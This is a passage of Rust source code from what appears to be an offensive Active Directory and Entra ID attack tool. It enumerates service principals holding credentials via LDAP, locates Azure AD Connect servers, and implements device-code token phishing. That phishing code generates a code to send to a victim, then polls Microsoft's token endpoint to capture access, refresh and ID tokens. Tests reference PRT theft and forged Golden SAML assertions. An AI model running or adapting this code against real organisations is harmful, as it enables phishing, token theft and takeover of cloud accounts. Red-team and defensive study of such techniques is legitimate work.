        }

        creds.push(format!("entra_connect_server: {server}"));
    }

    if creds.is_empty() {
        Err(OverthroneError::custom(
            "No Entra Connect credentials could be extracted",
        ))
    } else {
        Ok(creds)
    }
}

// ═══════════════════════════════════════════════════════════
//  App Registration / Service Principal Enumeration
// ═══════════════════════════════════════════════════════════

/// An Azure AD / Entra ID application registration with credential metadata.
#[derive(Debug, Clone, Serialize, Deserialize)]
struct AppRegistrationInfo {
    name: String,
    app_id: String,
    has_federated_credentials: bool,
    has_password_credentials: bool,
    tenant_id: Option<String>,
}

/// Enumerate application registrations from the AD partition.
///
/// Queries Active Directory for service principals and application
/// objects that have password credentials or federated credentials.
async fn enumerate_app_registrations(ldap: &mut LdapSession) -> Result<Vec<AppRegistrationInfo>> {
    let mut apps = Vec::new();

    // Query for service principals with password credentials
    let entries = ldap
        .custom_search(
            "(&(objectClass=servicePrincipalName)(msDS-ApplicationId=*))",
            &[
                "cn",
                "msDS-ApplicationId",
                "msDS-PasswordCredentials",
                "msDS-FederatedCredentials",
                "msDS-KeyCredentialLink",
                "servicePrincipalName",
            ],
        )
        .await
        .map_err(|e| OverthroneError::Ldap {
            target: "azure_ad".into(),
            reason: e.to_string(),
        })?;

    for entry in &entries {
        let name = entry
            .attrs
            .get("cn")
            .and_then(|v| v.first())
            .cloned()
            .unwrap_or_default();
        let app_id = entry
            .attrs
            .get("msDS-ApplicationId")
            .and_then(|v| v.first())
            .cloned()
            .unwrap_or_default();

        if name.is_empty() || app_id.is_empty() {
            continue;
        }

        let has_password = entry.attrs.contains_key("msDS-PasswordCredentials");
        let has_federated = entry.attrs.contains_key("msDS-FederatedCredentials");
        let has_key_creds = entry.attrs.contains_key("msDS-KeyCredentialLink");

        apps.push(AppRegistrationInfo {
            name,
            app_id,
            has_federated_credentials: has_federated || has_key_creds,
            has_password_credentials: has_password,
            tenant_id: None,
        });
    }

    Ok(apps)
}

// ═══════════════════════════════════════════════════════════
//  Device Code Authentication — Token Phishing
// ═══════════════════════════════════════════════════════════

/// Information about a device code authentication request used for phishing.
#[derive(Debug, Clone, Serialize, Deserialize)]
struct DeviceCodeAuthInfo {
    device_code: String,
    user_code: String,
    verification_url: String,
    interval_seconds: u64,
    expires_in: u64,
}

/// Generate a device code authentication request.
///
/// This creates a user-friendly code that can be sent to a target
/// via phishing. If the user authenticates, we capture the resulting token.
async fn generate_device_code_auth(config: &AzureAdConfig) -> Result<DeviceCodeAuthInfo> {
    let tenant = config.tenant_id.as_deref().unwrap_or("organizations");
    let url = format!("https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode");

    let client = reqwest::Client::builder()
        .timeout(HTTP_TIMEOUT)
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        .build()
        .map_err(|e| OverthroneError::custom(format!("HTTP client: {e}")))?;

    let params = [
        ("client_id", MS_LOGIN_CLIENT_ID),
        (
            "scope",
            "openid profile email offline_access https://graph.microsoft.com/.default",
        ),
    ];

    let resp = client
        .post(&url)
        .form(&params)
        .send()
        .await
        .map_err(|e| OverthroneError::custom(format!("Device code request failed: {e}")))?;

    let body: HashMap<String, serde_json::Value> = resp
        .json()
        .await
        .map_err(|e| OverthroneError::custom(format!("Device code parse failed: {e}")))?;

    let device_code = body
        .get("device_code")
        .and_then(|v| v.as_str())
        .ok_or_else(|| OverthroneError::custom("No device_code in response"))?
        .to_string();

    let user_code = body
        .get("user_code")
        .and_then(|v| v.as_str())
        .ok_or_else(|| OverthroneError::custom("No user_code in response"))?
        .to_string();

    let verification_url = body
        .get("verification_uri")
        .and_then(|v| v.as_str())
        .unwrap_or("https://microsoft.com/devicelogin")
        .to_string();

    let interval = body.get("interval").and_then(|v| v.as_u64()).unwrap_or(5);
    let expires = body
        .get("expires_in")
        .and_then(|v| v.as_u64())
        .unwrap_or(900);

    info!("Device code generated: {user_code} at {verification_url} (expires in {expires}s)");

    Ok(DeviceCodeAuthInfo {
        device_code,
        user_code,
        verification_url,
        interval_seconds: interval,
        expires_in: expires,
    })
}

/// Poll the device code authentication endpoint until the user authenticates.
///
/// Polls at the specified interval until the token is granted or the code expires.
async fn poll_device_code_auth(auth: &DeviceCodeAuthInfo) -> Result<Vec<String>> {
    let mut creds = Vec::new();
    let client = reqwest::Client::builder()
        .timeout(HTTP_TIMEOUT)
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        .build()
        .map_err(|e| OverthroneError::custom(format!("HTTP client: {e}")))?;

    let url = "https://login.microsoftonline.com/organizations/oauth2/v2.0/token";

    let poll_start = std::time::Instant::now();
    let max_duration = std::time::Duration::from_secs(auth.expires_in);

    while poll_start.elapsed() < max_duration {
        let params = [
            ("grant_type", "urn:ietf:params:oauth:grant-type:device_code"),
            ("client_id", MS_LOGIN_CLIENT_ID),
            ("device_code", &auth.device_code),
        ];

        match client.post(url).form(&params).send().await {
            Ok(resp) => {
                let status = resp.status();
                let body: HashMap<String, serde_json::Value> =
                    resp.json().await.unwrap_or_default();

                if status.is_success() {
                    if let Some(at) = body.get("access_token").and_then(|v| v.as_str()) {
                        creds.push(format!("oauth2_access_token: {at}"));
                    }
                    if let Some(rt) = body.get("refresh_token").and_then(|v| v.as_str()) {
                        creds.push(format!("oauth2_refresh_token: {rt}"));
                    }
                    if let Some(id) = body.get("id_token").and_then(|v| v.as_str()) {
                        creds.push(format!("id_token: {id}"));
                    }
                    return Ok(creds);
                }

                // Check for authorization_pending (expected until user completes)
                let error = body.get("error").and_then(|v| v.as_str()).unwrap_or("");

                if error == "authorization_pending" {
                    tokio::time::sleep(std::time::Duration::from_secs(auth.interval_seconds)).await;
                    continue;
                }

                if error == "expired_token" || error == "bad_verification_code" {
                    return Err(OverthroneError::custom(format!(
                        "Device code expired or invalid: {error}"
                    )));
                }

                if !error.is_empty() {
                    warn!("Device code poll error: {error}");
                }

                tokio::time::sleep(std::time::Duration::from_secs(auth.interval_seconds)).await;
            }
            Err(e) => {
                // Retry on network error
                warn!("Device code poll network error (retrying): {e}");
                tokio::time::sleep(std::time::Duration::from_secs(5)).await;
            }
        }
    }

    Err(OverthroneError::custom(
        "Device code authentication timed out — user did not authenticate in time",
    ))
}

// ═══════════════════════════════════════════════════════════
//  Helpers
// ═══════════════════════════════════════════════════════════

async fn find_ad_connect_servers(ldap: &mut LdapSession) -> Result<Vec<String>> {
    let entries = ldap
        .custom_search(
            "(&(objectClass=computer)(description=*Azure AD Connect*))",
            &["dNSHostName", "cn"],
        )
        .await?;

    Ok(entries
        .iter()
        .filter_map(|e| {
            e.attrs
                .get("dNSHostName")
                .or_else(|| e.attrs.get("cn"))
                .and_then(|v| v.first())
                .cloned()
        })
        .collect())
}

async fn discover_token_endpoints(config: &AzureAdConfig) -> Result<Vec<String>> {
    let mut endpoints = Vec::new();

    if let Some(ref tenant) = config.tenant_id {
        endpoints.push(format!(
            "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"
        ));
        endpoints.push(format!(
            "https://login.microsoftonline.com/{tenant}/oauth2/token"
        ));
    } else {
        endpoints.push(format!(
            "https://login.microsoftonline.com/{}/.well-known/openid-configuration",
            config.domain
        ));
    }

    endpoints.push(format!(
        "https://sts.{}/adfs/.well-known/openid-configuration",
        config.domain
    ));

    Ok(endpoints)
}

fn format_unix_time(epoch: u64) -> String {
    let secs = epoch as i64;
    let nanos = 0;
    match chrono::DateTime::from_timestamp(secs, nanos) {
        Some(dt) => dt.format("%Y-%m-%dT%H:%M:%SZ").to_string(),
        None => "1970-01-01T00:00:00Z".to_string(),
    }
}

// ═══════════════════════════════════════════════════════════
//  Tests
// ═══════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_azure_ad_sso_account() {
        assert_eq!(AZUREAD_SSO_ACCOUNT, "AZUREADSSOACC");
    }

    #[test]
    fn test_operation_display() {
        assert_eq!(AzureAdOperation::PrtTheft.to_string(), "PRT Theft");
        assert_eq!(AzureAdOperation::GoldenSaml.to_string(), "Golden SAML");
    }

    #[test]
    fn test_azure_config() {
        let cfg = AzureAdConfig {
            domain: "corp.local".into(),
            dc_ip: "192.168.1.10".into(),
            tenant_id: Some("tenant-id".into()),
            username: "user".into(),
            password: Some("pass".into()),
            nt_hash: None,
            enumerate_hybrid: true,
            operation: AzureAdOperation::GoldenSaml,
        };
        assert!(cfg.tenant_id.is_some());
        assert!(cfg.enumerate_hybrid);
    }

    #[test]
    fn test_saml_build() {
        let cert_der = vec![0x30, 0x82, 0x01, 0x01];
        let result = build_saml_assertion(
            "http://sts.corp.local/adfs/services/trust",
            "admin@corp.local",
            "https://login.microsoftonline.com/tenant/",
            &cert_der,
        );
        assert!(result.is_ok());
        let xml = result.unwrap();
        assert!(xml.contains("saml:Assertion"));
        assert!(xml.contains("admin@corp.local"));
        assert!(xml.contains("rsa-sha256"));
    }

    #[test]
    fn test_format_unix_time() {
        let s = format_unix_time(1700000000);
        assert!(!s.is_empty());
        assert!(s.contains('T'));
    }

    #[test]
    fn test_extract_saml() {
        let body = r#"<html><body><samlp:Response><saml:Assertion>test</saml:Assertion></samlp:Response></body></html>"#;
        let saml = extract_saml_from_response(body);
        assert!(saml.is_some());
        assert!(saml.unwrap().contains("saml:Assertion"));
    }

    #[test]
    fn test_token_endpoints() {
        let cfg = AzureAdConfig {
            domain: "corp.local".into(),
            dc_ip: "192.168.1.10".into(),
            tenant_id: Some("contoso".into()),
            username: "user".into(),
            password: Some("pass".into()),
            nt_hash: None,
            enumerate_hybrid: true,
            operation: AzureAdOperation::EnumHybridIdentity,
        };
        let rt = tokio::runtime::Runtime::new().unwrap();
        let eps = rt.block_on(discover_token_endpoints(&cfg)).unwrap();
        assert!(eps.iter().any(|e| e.contains("contoso")));
        assert_eq!(eps.len(), 3);
    }

    #[test]
    fn test_base_dn_extraction_logic() {
        let parts: Vec<&str> = "DC=corp,DC=local"
            .split(',')
            .filter(|p| p.trim().to_uppercase().starts_with("DC="))
            .collect();
        assert_eq!(parts.join(","), "DC=corp,DC=local");

        let parts: Vec<&str> = "CN=Users,DC=test,DC=com"
            .split(',')
            .filter(|p| p.trim().to_uppercase().starts_with("DC="))
            .collect();
        assert_eq!(parts.join(","), "DC=test,DC=com");

        let empty = "CN=Configuration";
        let parts: Vec<&str> = empty
            .split(',')
            .filter(|p| p.trim().to_uppercase().starts_with("DC="))
            .collect();
        assert_eq!(parts.len(), 0);
    }
}
